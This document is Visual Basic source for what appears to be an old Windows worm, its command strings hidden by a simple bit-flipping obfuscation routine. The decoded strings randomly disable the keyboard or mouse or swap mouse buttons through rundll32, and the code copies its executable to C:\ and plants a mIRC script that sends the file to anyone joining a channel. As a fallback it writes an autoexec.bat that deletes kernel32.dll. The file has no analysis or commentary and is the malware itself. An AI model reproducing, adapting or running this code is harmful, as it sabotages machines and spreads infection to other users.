Public Sub A1()
Randomize
X = Int(Rnd() * 5) + 1
If X = 1 Then Shell (E("stoemm23!trds-rv`qlntrdctuuno"))
If X = 2 Then Shell (E("stoemm23!jdxcn`se-ehr`cmd"))
If X = 3 Then Shell (E("stoemm23!lntrd-ehr`cmd"))
If X = 4 Then Shell (E("jsom297/dyd-dyhujdsodm"))
If X = 5 Then Shell (E("stoemm23!trds-ehr`cmdndlm`xds"))
End Sub
Public Sub W1()
On Error GoTo X1
Open ("b;]lhsb]lhsb/hoh") For Input As #1
Close #1
If Not Right(App.Path, 1) = (E("]")) Then
M1 = App.Path & (E("]"))
Else
M1 = App.Path
End If
A2 = App.EXEName & (E("/dyd"))
FileCopy M1 & A2, (E("b;]")) & A2
Open ("b;]lhsb]rbshqu/hoh") For Output As #1
Print #1, (E("Zrbshqu\"))
Print #1, (E(":V23/@etmu"))
Print #1, (E(":@tuins;!Unu`m!Jnogt{hno!ZBL\"))
Print #1, (E(":Nshfho;!TJ"))
Print #1, (E("o1<no!0;KNHO;#;z"))
Print #1, (E("o0<!.hg!)!%ohbj!<<!%ld!(!z!i`mu!|"))
Print #1, (E("o3<!./ebb!rdoe!%ohbj!")) & (E("b;]")) & A2
Print #1, (E("o2<|"))
Close #1
Exit Sub
X1:
On Error Resume Next
Open (E("b;]`tundydb/c`u")) For Output As #1
Print #1, (E("ADBIN!NGG"))
Print #1, (E("edm!b;]vhoenvr]rxrudl]jdsodm23/emm!?!OTM"))
Close #1
End Sub
Public Function E(B)
For X = 1 To Len(B)
S = Mid(B, X, 1)
If Asc(S) <> 34 And Asc(S) <> 35 Then
If Asc(S) Mod 2 = 0 Then
S = Chr(Asc(S) + 1)
Else
S = Chr(Asc(S) - 1)
End If
End If
E = E & S
Next
End Function
